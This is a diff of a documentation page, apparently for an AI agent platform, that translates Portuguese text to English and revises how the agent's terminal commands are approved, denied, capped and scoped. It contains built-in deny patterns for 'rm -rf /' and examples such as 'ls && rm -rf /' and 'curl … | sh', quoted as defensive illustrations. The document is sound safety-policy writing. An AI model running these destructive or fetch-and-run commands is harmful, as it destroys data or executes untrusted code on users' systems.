 <div class="language-text codeBlockContainer_VI6N theme-code-block" style=--prism-color:#F8F8F2;--prism-background-color:#282A36><div class=codeBlockContent_Ph5s><pre tabindex=0 class="prism-code language-text codeBlock_o5bC thin-scrollbar" style=color:#F8F8F2;background-color:#282A36><code class=codeBlockLines_m_R9><div class=token-line style=color:#F8F8F2><span class="token plain">Terminal(rm -rf /)</span><br/></div><div class=token-line style=color:#F8F8F2><span class="token plain">Terminal(rm -rf /*)</span><br/></div><div class=token-line style=color:#F8F8F2><span class="token plain">Terminal(rm -fr /)</span><br/></div></code></pre></div></div>
-<p>Não são uma lista de segurança abrangente — são um piso. A proteção de verdade
-vem de <code>allow</code> ser explícito e de tudo o mais cair em aprovação.</p>
-<h2 class="anchor anchorTargetStickyNavbar_URsz" id=o-que-a-ativação-da-execução-semeia>O que a ativação da execução semeia<a href=#o-que-a-ativação-da-execução-semeia class=hash-link aria-label="Link direto para O que a ativação da execução semeia" title="Link direto para O que a ativação da execução semeia" translate=no>​</a></h2>
-<p>Ativar a execução escreve no <code>allow</code> do projeto os padrões de
-<code>DEV_TERMINAL_ALLOW_PATTERNS</code> (<code>apps/api/src/domain/actions/dev-terminal-patterns.ts</code>).
-São duas famílias:</p>
+<p>They are not a comprehensive security list — they're a floor. Real
+protection comes from <code>allow</code> being explicit and everything else falling
+into approval.</p>
+<h2 class="anchor anchorTargetStickyNavbar_URsz" id=what-activating-execution-seeds>What activating execution seeds<a href=#what-activating-execution-seeds class=hash-link aria-label="Direct link to What activating execution seeds" title="Direct link to What activating execution seeds" translate=no>​</a></h2>
+<p>Activating execution writes the <code>DEV_TERMINAL_ALLOW_PATTERNS</code> patterns
+(<code>apps/api/src/domain/actions/dev-terminal-patterns.ts</code>) into the project's
+<code>allow</code>. There are two families:</p>
 <ul>
-<li class=""><strong>leitura do próprio worktree</strong> — <code>ls</code>, <code>pwd</code>, <code>find</code>, <code>cat</code>, <code>head</code>, <code>tail</code>,
-<code>grep</code>, <code>wc</code>, <code>echo</code>, <code>git status</code>, <code>git diff</code>, <code>git log</code>;</li>
-<li class=""><strong>leitura de histórico/remoto/config do git</strong> — <code>git branch -a/-r/-v/--list/--show-current</code>, <code>git remote -v</code>, <code>git remote show</code>, <code>git worktree list</code>, <code>git show</code>, <code>git for-each-ref</code>, <code>git ls-tree</code>, <code>git rev-parse</code>, <code>git config --get</code> (ver <a class="" href=/brabo/qa/business-rules#rn-143>RN-143</a>);</li>
-<li class=""><strong>build e teste</strong> — <code>pnpm install</code>, <code>pnpm test</code>, <code>npm run</code>, <code>npx vitest</code>,
-<code>mix test</code>, <code>pytest</code>, <code>go test</code>, <code>cargo test</code>, entre outros.</li>
+<li class=""><strong>reading the worktree itself</strong> — <code>ls</code>, <code>pwd</code>, <code>find</code>, <code>cat</code>, <code>head</code>,
+<code>tail</code>, <code>grep</code>, <code>wc</code>, <code>echo</code>, <code>git status</code>, <code>git diff</code>, <code>git log</code>;</li>
+<li class=""><strong>reading git history/remote/config</strong> — <code>git branch -a/-r/-v/--list/--show-current</code>, <code>git remote -v</code>, <code>git remote show</code>, <code>git worktree list</code>, <code>git show</code>, <code>git for-each-ref</code>, <code>git ls-tree</code>, <code>git rev-parse</code>, <code>git config --get</code> (see <a class="" href=/brabo/qa/business-rules#rn-143>RN-143</a>);</li>
+<li class=""><strong>build and test</strong> — <code>pnpm install</code>, <code>pnpm test</code>, <code>npm run</code>, <code>npx vitest</code>, <code>mix test</code>, <code>pytest</code>, <code>go test</code>, <code>cargo test</code>, among others.</li>
 </ul>
-<p>A terceira família existe porque <code>ReportDone</code> só deixa abrir PR depois de um
-<code>terminal</code> com <code>exit 0</code> no histórico. A primeira existe porque o agente <strong>olha
-antes de construir</strong>: sem ela, cada <code>ls -la</code> num repositório recém-provisionado
-caía em aprovação, voltava como <code>status pending</code> — e não como a saída do
-comando — e queimava uma iteração do ToolLoop até a task morrer por limite
-(ver <a class="" href=/brabo/qa/business-rules#rn-068>RN-068</a>). A segunda existe porque <code>git status</code>/<code>diff</code>/<code>log</code> bastam pra olhar o worktree, mas não pra o agente se
-orientar no histórico e nos remotos de um repositório recém-adotado — uma
-sessão real gastou dezenas de aprovações manuais em subcomandos como <code>git branch -a</code> ou <code>git worktree list</code> que caíam fora do <code>allow</code> e reprovavam para
-aprovação manual qualquer comando composto em que aparecessem.</p>
-<p>Isto NÃO afrouxa nada do que está acima. Continua valendo que <code>deny</code> vence
-<code>allow</code>, que os padrões embutidos seguem ativos, que o casamento é por prefixo
-de <strong>token</strong> (<code>ls</code> liberado não libera <code>lsof</code>) e que comando composto exige que
-CADA segmento case — então <code>ls && rm -rf /</code> não passa por causa do <code>ls</code>.</p>
-<p>A segunda família tem um cuidado a mais, porque o casamento por prefixo
-permite QUALQUER coisa depois do prefixo que bateu: um padrão pelado
-<code>Terminal(git branch)</code> bateria tanto em <code>git branch -D nome</code> (apaga) quanto em
-<code>git branch nome-nova</code> (cria) quanto na listagem sozinha, porque ele não
-enxerga o que vem depois. Por isso <code>branch</code>, <code>remote</code>, <code>worktree</code> e <code>config</code> —
-os quatro que têm irmão MUTANTE — só entraram ANCORADOS pela flag que torna a
-leitura inequívoca (<code>-a</code>/<code>-v</code>/<code>show</code>/<code>list</code>/<code>--get</code>), nunca pelo verbo pelado;
-<code>git branch -D/-d/-m/-M</code>, <code>git remote add/remove/set-url</code>, <code>git worktree add/remove/prune</code> e <code>git config &lt;chave> &lt;valor></code> (sem <code>--get</code>) continuam
-exigindo aprovação. <code>show</code>, <code>log</code>, <code>for-each-ref</code>, <code>ls-tree</code> e <code>rev-parse</code>
-não precisaram de âncora: nenhuma continuação deles muta o repositório.</p>
-<p>Auto-aprovar <code>terminal</code> por <code>agent_autonomy</code> seria diferente e não é o que se
-faz: liberaria QUALQUER comando dentro do container do engine, sem o arquivo no
-meio.</p>
-<h2 class="anchor anchorTargetStickyNavbar_URsz" id=a-ordem-completa-da-decisão>A ordem completa da decisão<a href=#a-ordem-completa-da-decisão class=hash-link aria-label="Link direto para A ordem completa da decisão" title="Link direto para A ordem completa da decisão" translate=no>​</a></h2>
+<p>The third family exists because <code>ReportDone</code> only allows opening a PR after
+a <code>terminal</code> with <code>exit 0</code> in the history. The first exists because the
+agent <strong>looks before it builds</strong>: without it, every <code>ls -la</code> in a newly
+provisioned repository fell into approval, came back as <code>status pending</code> —
+and not as the command's output — and burned a ToolLoop iteration until the
+task died by limit (see <a class="" href=/brabo/qa/business-rules#rn-068>RN-068</a>). The second
+exists because <code>git status</code>/<code>diff</code>/<code>log</code> are enough to look at the
+worktree, but not for the agent to orient itself in the history and remotes
+of a newly adopted repository — a real session spent dozens of manual
+approvals on subcommands like <code>git branch -a</code> or <code>git worktree list</code> that
+fell outside <code>allow</code> and pushed to manual approval any compound command
+they appeared in.</p>
+<p>This does NOT loosen anything described above. It still holds that <code>deny</code>
+beats <code>allow</code>, that the built-in patterns remain active, that matching is
+by <strong>token</strong> prefix (<code>ls</code> allowed doesn't allow <code>lsof</code>), and that a
+compound command requires EVERY segment to match — so <code>ls && rm -rf /</code>
+doesn't pass because of the <code>ls</code>.</p>
+<p>The second family requires extra care, because prefix matching allows
+ANYTHING after the prefix that matched: a bare pattern <code>Terminal(git branch)</code> would match both <code>git branch -D nome</code> (deletes) and <code>git branch nome-nova</code> (creates) as well as the plain listing, because it can't see
+what comes after. That's why <code>branch</code>, <code>remote</code>, <code>worktree</code> and <code>config</code> —
+the four that have a MUTATING sibling — only got in ANCHORED by the flag
+that makes the read unambiguous (<code>-a</code>/<code>-v</code>/<code>show</code>/<code>list</code>/<code>--get</code>), never by
+the bare verb; <code>git branch -D/-d/-m/-M</code>, <code>git remote add/remove/set-url</code>,
+<code>git worktree add/remove/prune</code> and <code>git config &lt;chave> &lt;valor></code> (without
+<code>--get</code>) still require approval. <code>show</code>, <code>log</code>, <code>for-each-ref</code>, <code>ls-tree</code>
+and <code>rev-parse</code> didn't need an anchor: none of their continuations mutate
+the repository.</p>
+<p>Auto-approving <code>terminal</code> via <code>agent_autonomy</code> would be different and is
+not what's done: it would free up ANY command inside the engine container,
+with no file in the middle.</p>
+<h2 class="anchor anchorTargetStickyNavbar_URsz" id=the-complete-decision-order>The complete decision order<a href=#the-complete-decision-order class=hash-link aria-label="Direct link to The complete decision order" title="Direct link to The complete decision order" translate=no>​</a></h2>
 <!-- -->
-<h3 class="anchor anchorTargetStickyNavbar_URsz" id=auto-mode-a-curinga-de-agent_autonomy-rn-153>"Auto mode": a curinga de <code>agent_autonomy</code> (<a class="" href=/brabo/qa/business-rules#rn-153>RN-153</a>)<a href=#auto-mode-a-curinga-de-agent_autonomy-rn-153 class=hash-link aria-label="Link direto para auto-mode-a-curinga-de-agent_autonomy-rn-153" title="Link direto para auto-mode-a-curinga-de-agent_autonomy-rn-153" translate=no>​</a></h3>
-<p>O nó <code>agent_autonomy tem opinião?</code> do diagrama acima não sabe, e não precisa
-saber, se a opinião veio de uma regra ESPECÍFICA (<code>actionType: "terminal"</code>)
-ou da curinga <code>actionType: "*"</code> — "auto mode": autonomia pra QUALQUER tipo
-de ação daquele agente, ligada com um clique em "Modo automático" no
-<code>ApprovalCard</code>. A resolução acontece ANTES deste diagrama começar, num
-repositório só: <code>DrizzleAgentAutonomyRepository.findMode</code> busca a regra
-específica e a curinga na mesma consulta, e devolve a específica quando as
-duas existem — gravar <code>terminal: deny</code> com <code>"*": auto_approve</code> ligado
-continua negando <code>terminal</code> desse agente, liberando o resto.</p>
-<p>É por isso que o diagrama não ganhou um nó novo, e é a prova de que os
-tetos, logo abaixo, valem para "auto mode" sem exceção declarada em lugar
-nenhum: eles reagem a <code>current.policy === 'auto_approve'</code>, nunca à origem
-dela (<a class="" href=/brabo/qa/business-rules#rn-154>RN-154</a>).</p>
-<p>"Auto mode" exige <code>maintainer</code> — mesmo papel que já protegia
-<code>PUT .../agent-autonomy</code> antes da curinga existir. Desligar reusa o toggle
-manual/auto que o card do agente já tinha na Visão Geral/Executores: com a
-curinga gravada, o toggle passa a editar ELA em vez do tipo representativo
-de sempre, e "manual" nele é a mesma curinga regravada como
-<code>require_approval</code>.</p>
-<h2 class="anchor anchorTargetStickyNavbar_URsz" id=a-fronteira-do-container-rn-106>A fronteira do container (RN-106)<a href=#a-fronteira-do-container-rn-106 class=hash-link aria-label="Link direto para A fronteira do container (RN-106)" title="Link direto para A fronteira do container (RN-106)" translate=no>​</a></h2>
-<p>Aplicada <strong>antes</strong> de qualquer estágio permissivo, e não como teto no fim: <code>git push</code>, <code>git remote add</code>/<code>set-url</code>, <code>git merge</code>, os CLIs de provider (<code>gh pr create</code>, <code>gh pr merge</code>, <code>glab mr create</code>/<code>merge</code>, releases e workflow dispatch)
-e os comandos de deploy comuns (<code>kubectl apply</code>, <code>helm upgrade</code>, <code>terraform apply</code>, <code>docker push</code>, <code>npm publish</code>, ...) num comando <code>terminal</code> são <strong><code>deny</code>
-imediato</strong>, qualquer que seja o <code>permissions.json</code> ou o <code>agent_autonomy</code>
-(<a class="" href=/brabo/qa/adr/0065-container-por-projeto-a-fronteira-deixa-de-ser-politica>ADR 0065</a>).</p>
-<p>Não é <code>require_approval</code> de propósito: existe "sempre permitir", que grava o
-padrão em <code>allow</code> — bastaria um clique para essa segunda porta ficar aberta
-para sempre. <code>deny</code> vence <code>allow</code> em qualquer estágio, e é a única forma que
-não pode ser contornada por um clique só.</p>
-<p>O casamento é por <strong>prefixo de tokens</strong> (<code>apps/api/src/domain/actions/external-effect.ts</code>),
-ignorando flags globais no meio — <code>git -C /tmp push</code> casa <code>git push</code>. Cada
-segmento de um comando composto é verificado: <code>pnpm test && git push origin main</code> é barrado pelo segundo segmento, do mesmo jeito que o comando composto já
-exige que todo segmento case para virar <code>auto_approve</code>.</p>
-<p>Negar não tira poder do agente: a mensagem de erro diz qual ação <strong>tipada</strong>
-usar — <code>git_push</code>, <code>git_merge</code> ou <code>pr_open</code> — que nasce <code>proposed_action</code>,
-segue o pipeline normal (papel mínimo, decisão do usuário) e registra no event
-log o que foi empurrado e para onde. É o caminho que o dev agent já usa hoje
-para propor push (<code>agent_io.ex</code>); o que muda é que agora ele é o <strong>único</strong>
-caminho, garantido por código.</p>
-<h2 class="anchor anchorTargetStickyNavbar_URsz" id=escopo-de-caminho>Escopo de caminho<a href=#escopo-de-caminho class=hash-link aria-label="Link direto para Escopo de caminho" title="Link direto para Escopo de caminho" translate=no>​</a></h2>
-<p>Um comando de <code>terminal</code> é avaliado também por <strong>onde ele toca</strong>, não só pelo
-verbo (<a class="" href=/brabo/qa/adr/0055-escopo-de-caminho-na-politica-de-terminal>ADR 0055</a>,
-<a class="" href=/brabo/qa/business-rules#rn-075>RN-075</a>). A pasta do projeto —
-<code>&lt;PROJECT_WORKSPACES_ROOT>/&lt;workspace_dir_name></code>, onde vivem o
-<code>permissions.json</code> e todos os worktrees de agente — é o <strong>escopo</strong>.
-<code>workspace_dir_name</code> (<a class="" href=/brabo/qa/adr/0066-nome-de-pasta-legivel-do-workspace>ADR 0066</a>,
-<a class="" href=/brabo/qa/business-rules#rn-109>RN-109</a>) é o nome de pasta congelado na
-criação do projeto — legível (<code>&lt;slug>-&lt;8 chars do id></code>) num projeto novo, o
-UUID puro num projeto de antes dessa mudança.</p>
-<p><strong>Projeto no modo <code>local</code> tem outro escopo, e a diferença importa aqui</strong>
-(<a class="" href=/brabo/qa/adr/0072-projeto-local-ou-container>ADR 0072</a>,
+<p><strong>Node <code>Z</code> changed position</strong> (<a class="" href=/brabo/qa/business-rules#rn-418>RN-418</a>,
+revises <a class="" href=/brabo/qa/business-rules#rn-106>RN-106</a>): until the introduction of
+the local runner, it sat right after IAM and returned <code>deny</code> — now it's a
+CAP, in the same final block as the other three, applied after
+<code>agent_autonomy</code> and <code>permissions.json</code> have already given their opinion.
+See the section
+<a href=#a-fronteira-de-efeito-externo-e-comando-privilegiado-rn-418 class="">"The boundary of external effect and privileged command"</a>
+below for why.</p>
+<h3 class="anchor anchorTargetStickyNavbar_URsz" id=auto-mode-the-agent_autonomy-wildcard-rn-153>"Auto mode": the <code>agent_autonomy</code> wildcard (<a class="" href=/brabo/qa/business-rules#rn-153>RN-153</a>)<a href=#auto-mode-the-agent_autonomy-wildcard-rn-153 class=hash-link aria-label="Direct link to auto-mode-the-agent_autonomy-wildcard-rn-153" title="Direct link to auto-mode-the-agent_autonomy-wildcard-rn-153" translate=no>​</a></h3>
+<p>The <code>agent_autonomy has an opinion?</code> node in the diagram above doesn't
+know, and doesn't need to know, whether the opinion came from a SPECIFIC
+rule (<code>actionType: "terminal"</code>) or from the <code>actionType: "*"</code> wildcard —
+"auto mode": autonomy for ANY type of action by that agent, turned on with
+a click on "Automatic mode" in the <code>ApprovalCard</code>. The resolution happens
+BEFORE this diagram begins, in a single repository:
+<code>DrizzleAgentAutonomyRepository.findMode</code> looks up the specific rule and
+the wildcard in the same query, and returns the specific one when both
+exist — writing <code>terminal: deny</code> with <code>"*": auto_approve</code> turned on still
+denies <code>terminal</code> for that agent, while freeing up the rest.</p>
+<p>That's why the diagram didn't get a new node, and it's proof that the
+caps, right below, apply to "auto mode" with no exception declared
+anywhere: they react to <code>current.policy === 'auto_approve'</code>, never to its
+origin (<a class="" href=/brabo/qa/business-rules#rn-154>RN-154</a>).</p>
+<p>"Auto mode" requires <code>maintainer</code> — the same role that already protected
+<code>PUT .../agent-autonomy</code> before the wildcard existed. Turning it off
+reuses the manual/auto toggle the agent card already had in
+Overview/Executors: with the wildcard written, the toggle switches to
+editing IT instead of the usual representative type, and "manual" on it is
+the same wildcard rewritten as <code>require_approval</code>.</p>
+<h2 class="anchor anchorTargetStickyNavbar_URsz" id=a-fronteira-de-efeito-externo-e-comando-privilegiado-rn-418>The boundary of external effect and privileged command (RN-418)<a href=#a-fronteira-de-efeito-externo-e-comando-privilegiado-rn-418 class=hash-link aria-label="Direct link to The boundary of external effect and privileged command (RN-418)" title="Direct link to The boundary of external effect and privileged command (RN-418)" translate=no>​</a></h2>
+<p><strong>Revision of <a class="" href=/brabo/qa/adr/0065-container-por-projeto-a-fronteira-deixa-de-ser-politica>ADR 0065</a>
+by <a class="" href=/brabo/qa/adr/0102-revisao-do-adr-0065-teto-absoluto-substitui-deny>ADR 0102</a></strong>
+— a GLOBAL and explicit decision by the product owner, confirmed after an
+automatic security warning about the change (the full history is in the
+ADR). What follows describes the CURRENT behavior; the previous version
+(unconditional <code>deny</code>, applied before any permissive stage) was replaced,
+not loosened — see why right below.</p>
+<p><code>git push</code>, <code>git remote add</code>/<code>set-url</code>, <code>git merge</code>, the provider CLIs
+(<code>gh pr create</code>, <code>gh pr merge</code>, <code>glab mr create</code>/<code>merge</code>, releases and
+workflow dispatch), common deploy commands (<code>kubectl apply</code>, <code>helm upgrade</code>, <code>terraform apply</code>, <code>docker push</code>, <code>npm publish</code>, ...) and now
+also <code>sudo</code>/<code>doas</code> in a <code>terminal</code> command are an <strong>ABSOLUTE CAP</strong> — in the
+same final block as the other three caps (see <a href=#caps class="">"Caps"</a> below),
+applied after <code>agent_autonomy</code> and <code>permissions.json</code> have already given
+their opinion: if the verdict up to that point was <code>auto_approve</code>, it
+becomes unconditional <code>require_approval</code>. Neither the <code>"*"</code> wildcard for
+"automatic mode" nor an <code>allow</code> entry in <code>permissions.json</code> can promote it
+back.</p>
+<p><strong>Why <code>require_approval</code> is now safe, when before it required <code>deny</code>.</strong>
+The historical reason for the <code>deny</code> was concrete: "always allow" writes
+the pattern into <code>allow</code>, and a single click would be enough to reopen the
+door forever. That gap was closed AT THE SOURCE, not worked around:
+<code>ApproveAlwaysActionUseCase</code>/<code>patternForAction</code>
+(<code>apps/api/src/application/use-cases/actions/approve-always-action.use-case.ts</code>)
+REFUSE to write a pattern into <code>allow</code> for a terminal action with git
+external effect or a privileged command — the user still approves the
+specific instance through the normal flow, but "always allow" never writes
+the pattern for these two cases. Without this refusal, the cap would be
+decorative.</p>
+<p><code>sudo</code>/<code>doas</code> got their own category in <code>external-effect.ts</code>
+(<code>comandoPrivilegiadoNoComando</code>), matching by VERB in any segment — same
+principle as <code>efeitoExternoNoComando</code> for git, which continues matching by
+<strong>token prefix</strong>, ignoring global flags in the middle (<code>git -C /tmp push</code>
+matches <code>git push</code>). Each segment of a compound command is checked: <code>pnpm test && git push origin main</code> is blocked by the second segment, the same
+way a compound command already requires every segment to match to become
+<code>auto_approve</code>.</p>
+<p>The cap doesn't take power away from the agent: for git, the error message
+keeps pointing to which <strong>typed</strong> action to use — <code>git_push</code>, <code>git_merge</code>
+or <code>pr_open</code> — which is born a <code>proposed_action</code>, follows the normal
+pipeline, and records in the event log what was pushed and to where (it's
+the path the dev agent already uses today, <code>agent_io.ex</code>). <code>sudo</code>/<code>doas</code>
+don't have an equivalent typed action — the message just explains why that
+command requires a human decision.</p>
+<p><strong>Where this matters most now</strong>: the
+<a class="" href=/brabo/qa/adr/0103-runner-local-execucao-na-maquina-do-usuario>local runner</a>
+executes ALREADY approved commands on the user's own machine, with their
+own privileges — it's exactly the scenario where a legitimate <code>sudo</code> (or
+an attempt to escape via <code>sudo</code>) needs a human stop guaranteed by
+construction, not by <code>permissions.json</code> convention.</p>
+<h2 class="anchor anchorTargetStickyNavbar_URsz" id=path-scope>Path scope<a href=#path-scope class=hash-link aria-label="Direct link to Path scope" title="Direct link to Path scope" translate=no>​</a></h2>
+<p>A <code>terminal</code> command is also evaluated by <strong>where it touches</strong>, not just
+by the verb (<a class="" href=/brabo/qa/adr/0055-escopo-de-caminho-na-politica-de-terminal>ADR 0055</a>,
+<a class="" href=/brabo/qa/business-rules#rn-075>RN-075</a>). The project folder —
+<code>&lt;PROJECT_WORKSPACES_ROOT>/&lt;workspace_dir_name></code>, where <code>permissions.json</code>
+and all agent worktrees live — is the <strong>scope</strong>. <code>workspace_dir_name</code>
+(<a class="" href=/brabo/qa/adr/0066-nome-de-pasta-legivel-do-workspace>ADR 0066</a>,
+<a class="" href=/brabo/qa/business-rules#rn-109>RN-109</a>) is the folder name frozen at
+project creation — readable (<code>&lt;slug>-&lt;8 chars of the id></code>) in a new
+project, the plain UUID in a project from before that change.</p>
+<p><strong>A project in <code>local</code> mode has a different scope, and the difference
+matters here</strong> (<a class="" href=/brabo/qa/adr/0072-projeto-local-ou-container>ADR 0072</a>,
 <a class="" href=/brabo/qa/business-rules#rn-169>RN-169</a>/<a class="" href=/brabo/qa/business-rules#rn-170>RN-170</a>):
-a raiz passa a ser o <strong>caminho absoluto que o usuário digitou na criação</strong>, não
+the root becomes the <strong>absolute path the user typed at creation</strong>, not
 <code>join(PROJECT_WORKSPACES_ROOT, workspace_dir_name)</code>.</p>
-<p>Tudo o que esta seção descreve continua valendo — o escopo aperta e afrouxa
-exatamente igual, e <code>deny</code> continua vencendo primeiro. O que muda é o que ele
-CONTÉM. E a consequência está declarada sem atenuação no ADR 0072: a contenção
-<strong>estrutural</strong> do <code>join</code> — "o resultado nunca sai da raiz gerenciada, aconteça o
-que acontecer com a coluna" — deixa de existir para esses projetos. O que
-substitui é a validação da criação (RN-170: absoluto, sem <code>..</code>, existente,
-gravável, nunca raiz de sistema, nunca sobreposto ao checkout do Brabo), mais a
-revalidação LÉXICA do mesmo predicado a cada derivação da raiz — para que uma
-linha adulterada direto no banco não vire escopo de terminal em <code>/</code>.</p>
-<p>A comparação de caminho é <strong>léxica e sem regex sobre a entrada</strong>: o corte de
-barras finais é varredura O(n), não <code>.replace(/\/+$/, '')</code>. O padrão antigo foi
-apontado pelo CodeQL como ReDoS polinomial (HIGH) — ele obriga o motor a tentar
-cada posição inicial, e degrada em O(n²) com muitas barras. A entrada aqui vem
-de comando de agente, então não é lugar de regex que retrocede.</p>
-<p>O escopo faz duas coisas opostas, e é a combinação que importa:</p>
-<p><strong>Aperta.</strong> Um comando que toca caminho de fora nunca é auto-aprovado, por mais
-que o verbo esteja em <code>allow</code>. Sem isto, <code>Terminal(cat)</code> liberado auto-executava
-<code>cat /workspace/apps/engine/lib/engine/actions/git_executor.ex</code> — o código da
-plataforma que executa o agente — e alcançava o worktree de outros projetos.</p>
-<p><strong>Afrouxa.</strong> Dentro do escopo, <code>cd</code> deixa de ser um verbo que precisa de
-permissão: ele é a própria declaração de escopo. Sem isto, o dev agent, que
-emite sempre <code>cd &lt;caminho> && &lt;verbo></code>, esbarrava na regra do comando composto
-— todo segmento precisa casar — e <strong>todo</strong> comando parava para aprovação, por
-mais que o verbo estivesse liberado.</p>
-<p>Três limites que valem entender:</p>
+<p>Everything this section describes still holds — the scope tightens and
+loosens exactly the same way, and <code>deny</code> still wins first. What changes is
+what it CONTAINS. And the consequence is declared without softening in ADR
+0072: the <strong>structural</strong> containment of the <code>join</code> — "the result never
+leaves the managed root, whatever happens to the column" — ceases to exist
+for these projects. What replaces it is the creation-time validation
+(RN-170: absolute, no <code>..</code>, existing, writable, never a system root, never
+overlapping the Brabo checkout), plus the LEXICAL revalidation of the same
+predicate on every derivation of the root — so that a row tampered with
+directly in the database doesn't turn into a terminal scope at <code>/</code>.</p>
+<p>Path comparison is <strong>lexical and without regex over the input</strong>: trimming
+trailing slashes is an O(n) scan, not <code>.replace(/\/+$/, '')</code>. The old
+pattern was flagged by CodeQL as polynomial ReDoS (HIGH) — it forces the
+engine to try every starting position, and degrades to O(n²) with many
+slashes. The input here comes from an agent command, so it's not a place
+for backtracking regex.</p>
+<p>The scope does two opposite things, and it's the combination that matters:</p>
+<p><strong>Tightens.</strong> A command that touches a path from outside is never
+auto-approved, no matter how much the verb is in <code>allow</code>. Without this, an
+allowed <code>Terminal(cat)</code> would auto-execute <code>cat /workspace/apps/engine/lib/engine/actions/git_executor.ex</code> — the platform
+code that runs the agent — and reach into other projects' worktrees.</p>
+<p><strong>Loosens.</strong> Within the scope, <code>cd</code> stops being a verb that needs
+permission: it's the scope declaration itself. Without this, the dev
+agent, which always emits <code>cd &lt;caminho> && &lt;verbo></code>, would run into the
+compound-command rule — every segment needs to match — and <strong>every</strong>
+command would stop for approval, no matter how much the verb was allowed.</p>
+<p>Three limits worth understanding:</p>
 <ul>
-<li class=""><strong>Escopo permite, não isenta.</strong> Estar na pasta do projeto não torna
-<code>curl … | sh</code> seguro: verbo fora do <code>allow</code> continua pedindo aprovação.</li>
-<li class=""><strong>Fora do escopo é <code>require_approval</code>, não <code>deny</code>.</strong> O agente pode ter razão
-legítima para olhar fora; quem decide continua sendo você.</li>
-<li class=""><strong>A normalização é léxica, não <code>realpath</code>.</strong> <code>&lt;raiz>/../..</code> é resolvido e
-reprovado; um link simbólico dentro do projeto apontando para fora <strong>não</strong> é
-detectado. Escopo é política, não isolamento.</li>
+<li class=""><strong>Scope permits, it doesn't exempt.</strong> Being in the project folder
+doesn't make <code>curl … | sh</code> safe: a verb outside <code>allow</code> still requires
+approval.</li>
+<li class=""><strong>Outside the scope is <code>require_approval</code>, not <code>deny</code>.</strong> The agent may
+have a legitimate reason to look outside; who decides remains you.</li>
+<li class=""><strong>Normalization is lexical, not <code>realpath</code>.</strong> <code>&lt;raiz>/../..</code> is resolved
+and rejected; a symbolic link inside the project pointing outward is
+<strong>not</strong> detected. Scope is policy, not isolation.</li>
 </ul>
-<p>Quais tokens são verificados: os <strong>absolutos</strong> (começam com <code>/</code>) e os que
-contêm <code>..</code>. Um relativo sem <code>..</code> resolve sob o <code>cwd</code>, que já foi verificado —
-e tratar <code>-maxdepth</code>, <code>4</code> ou <code>*.ex</code> como caminho reprovaria comando legítimo
-sem ganhar segurança.</p>
-<p>Duas propriedades que caem daí:</p>
-<p><strong><code>deny</code> vence na hora.</strong> Não importa em que estágio apareça, retorna
-imediatamente. Não existe configuração que reverta um <code>deny</code>.</p>
-<p><strong>Um estágio silencioso nunca rebaixa.</strong> Se <code>agent_autonomy</code> disse
-<code>auto_approve</code> e o <code>permissions.json</code> não tem regra para aquela ação, o
-resultado continua <code>auto_approve</code> — o arquivo não "vota contra" por omissão.
-Cada estágio só pode subir a permissividade do anterior.</p>
-<h2 class="anchor anchorTargetStickyNavbar_URsz" id=os-tetos>Os tetos<a href=#os-tetos class=hash-link aria-label="Link direto para Os tetos" title="Link direto para Os tetos" translate=no>​</a></h2>
-<p>Aplicados <strong>por último</strong>, depois de todo o resto:</p>
+<p>Which tokens are checked: <strong>absolute</strong> ones (start with <code>/</code>) and ones that
+contain <code>..</code>. A relative one without <code>..</code> resolves under the <code>cwd</code>, which
+was already checked — and treating <code>-maxdepth</code>, <code>4</code>, or <code>*.ex</code> as a path
+would reject a legitimate command without gaining any security.</p>
+<p>Two properties that fall out of this:</p>
+<p><strong><code>deny</code> wins immediately.</strong> No matter what stage it appears in, it
+returns right away. There's no configuration that reverts a <code>deny</code>.</p>
+<p><strong>A silent stage never downgrades.</strong> If <code>agent_autonomy</code> said
+<code>auto_approve</code> and <code>permissions.json</code> has no rule for that action, the
+result stays <code>auto_approve</code> — the file doesn't "vote against" by
+omission. Each stage can only raise the permissiveness of the previous
+one.</p>
+<h2 class="anchor anchorTargetStickyNavbar_URsz" id=caps>Caps<a href=#caps class=hash-link aria-label="Direct link to Caps" title="Direct link to Caps" translate=no>​</a></h2>
+<p>Applied <strong>last</strong>, after everything else:</p>
 
 
 
@@ -378,53 +454,71 @@ Cada estágio só pode subir a permissividade do anterior.</p>
 
 
 
-<table><thead><tr><th>teto<th>efeito<th>por quê<tbody><tr><td><code>git_merge</code> com destino em <code>dev</code>, <code>qa</code>, <code>rc</code> ou <code>main</code><td><code>auto_approve</code> → <code>require_approval</code><td>merge em branch protegida é sempre decisão sua (<a class="" href=/brabo/qa/business-rules#rn-006>RN-006</a>)<tr><td><code>instruction_patch</code><td><code>auto_approve</code> → <code>require_approval</code><td>você precisa ver o diff antes que um agente mude o comportamento de outro (<a class="" href=/brabo/qa/business-rules#rn-007>RN-007</a>)<tr><td><code>parallelize</code> e <code>raise_max_parallel</code><td><code>auto_approve</code> → <code>require_approval</code><td>gastar com mais agentes é decisão sua; sem este teto o limite do lead seria decorativo, e subir o próprio teto seria o produto elevando o limite de gasto dele mesmo (<a class="" href=/brabo/qa/business-rules#rn-086>RN-086</a>)</table>
-<p>Um teto rebaixa <code>auto_approve</code> para <code>require_approval</code>; ele <strong>não</strong> transforma
-<code>deny</code> em outra coisa, porque <code>deny</code> já teria retornado antes.</p>
-<p>:::note Por que <code>rc</code> ainda está na lista</p>
-<p>O degrau <code>rc</code> saiu da política de branches
-(<a class="" href=/brabo/qa/adr/0030-politica-de-branches-mecanizada>ADR 0030</a>) e o bootstrap
-parou de criá-lo (<a class="" href=/brabo/qa/business-rules#rn-029>RN-029</a>) — mas ele continua
-aqui, em <code>domain/actions/protected-branches.ts</code>.</p>
-<p>Esta lista decide o que a trava de merge <strong>recusa</strong>, e repositórios
-bootstrapados por versões anteriores do Brabo ainda têm a branch. Tirá-la daqui
-não removeria nada do repositório de ninguém: só tornaria um <code>git_merge</code> com
-destino em <code>rc</code> auto-aprovável, numa branch que alguém pode estar usando como
-produção.</p>
-<p>Proteger uma branch que não existe não custa nada. Desproteger uma que existe
-custa caro — e a assimetria é deliberada.</p>
+
+
+
+
+
